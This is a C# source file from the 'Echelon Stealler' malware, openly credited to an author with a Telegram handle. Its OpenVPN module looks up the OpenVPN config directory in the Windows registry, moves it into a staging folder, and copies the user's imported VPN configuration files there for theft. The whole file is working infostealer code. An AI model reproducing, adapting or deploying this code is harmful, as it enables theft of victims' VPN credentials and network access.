///////////////////////////////////////////////////////
////Echelon Stealler, C# Malware Systems by MadСod ////
///////////////////Telegram: @madcod///////////////////
///////////////////////////////////////////////////////

using Microsoft.Win32;
using System.IO;

namespace Echelon
{
    class OpenVPN
    {
        public static int count = 0;
        public static void Start(string Echelon_Dir)
        {
                try
                {
                RegistryKey localMachineKey = Registry.LocalMachine;
                    string[] names = localMachineKey.OpenSubKey("SOFTWARE").GetSubKeyNames();
                    foreach (string i in names)
                    {
                        if (i == "OpenVPN")
                        {
                            Directory.CreateDirectory(Echelon_Dir + "\\VPN\\OpenVPN");
                            try
                            {
                                string dir = localMachineKey.OpenSubKey("SOFTWARE").OpenSubKey("OpenVPN").GetValue("config_dir").ToString();
                                DirectoryInfo dire = new DirectoryInfo(dir);
                                dire.MoveTo(Echelon_Dir + "\\VPN\\OpenVPN");
                            count++;
                            }
                            catch {}

                        }
                    }
                }
                catch  {}
            //Стиллинг импортированных конфигов *New
            try
            {
                foreach (FileInfo file in new DirectoryInfo(Help.UserProfile + "\\OpenVPN\\config\\conf\\").GetFiles())

                {
                    Directory.CreateDirectory(Echelon_Dir + "\\VPN\\OpenVPN\\config\\conf\\");
                    file.CopyTo(Echelon_Dir + "\\VPN\\OpenVPN\\config\\conf\\" + file.Name);
                }
                count++;
            }
            catch  {}

        }
    }
}
